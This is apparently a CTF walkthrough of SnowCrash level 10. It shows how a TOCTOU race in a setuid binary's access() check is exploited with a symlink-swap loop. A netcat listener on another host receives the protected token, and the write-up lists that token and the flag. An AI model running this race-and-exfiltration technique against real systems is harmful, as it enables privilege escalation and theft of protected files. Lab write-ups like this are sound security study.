# Level10

In this level we have 2 files. The first is a file named `token` and the second is a binary.  
This program take a file and ip address. An `access` control is take with the function `access`
and the file is `read and send` in the `address ip`.  

So first to understand the behaviour, we can use this program with a file who has permissions.  

```bash
level10@SnowCrash:~$ ./level10 /tmp/test 192.168.56.114
Connecting to 192.168.56.114:6969 .. Unable to connect to host 192.168.56.114
```

We know that we need to listen the port 6969.  

```bash
┌─[✗]─[parrot@parrot]─[~]
└──╼ $nc -lp 6969
```

Result:

```bash
level10@SnowCrash:~$ ./level10 /tmp/test 192.168.56.114
Connecting to 192.168.56.114:6969 .. Connected!
Sending file .. wrote file!

┌─[✗]─[parrot@parrot]─[~]
└──╼ $nc -lp 6969
.*( )*.
hello
```

Secondly we can try with the file named `token`. Without suprises it's not working !

```bash
level10@SnowCrash:~$ ./level10 token 192.168.56.114
You don't have access to token
```

We can try to create a `symbolic link`.

```bash
level10@SnowCrash:~$ ln -sf $PWD/token /tmp/token
level10@SnowCrash:~$ ./level10 /tmp/token 192.168.56.114
You don't have access to /tmp/token
```

It's not working. After a time to search solution, we have find that the `access` function can be exploit.

## TOCTOU (Time Of Check To time of Use)  
It's a [race condition](https://shadowintel.medium.com/race-condition-attacks-b687c211592c). It's mean that 2 processes have access on same data.  
Between `check access` and `using data` we can exploit a race condition.  
In other word, we can try to do "You have access of this file" at the beginning and do "Oh! You are reading a file in which you haven't permissions" at the end.
To do this we can use this lines:  

```bash
level10@SnowCrash:~$ while true; do touch /tmp/token && ln -sf $PWD/token /tmp/token && rm -rf /tmp/token; done;
level10@SnowCrash:~$ while true; do ./level10 /tmp/token 192.168.56.114; done;
┌─[parrot@parrot]─[~]
└──╼ $nc -klp 6969
.*( )*.
woupa2yuojeeaaed06riuj63c
```

We send our commands in infinite loop to hope to have a chance to create a `race condition`.  
To receive the data we must use `nc -lkp PORT` in the host. We using the `-k` option to force nc to stay listenning.


```bash
level10@SnowCrash:~$ su flag10
Password: 
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
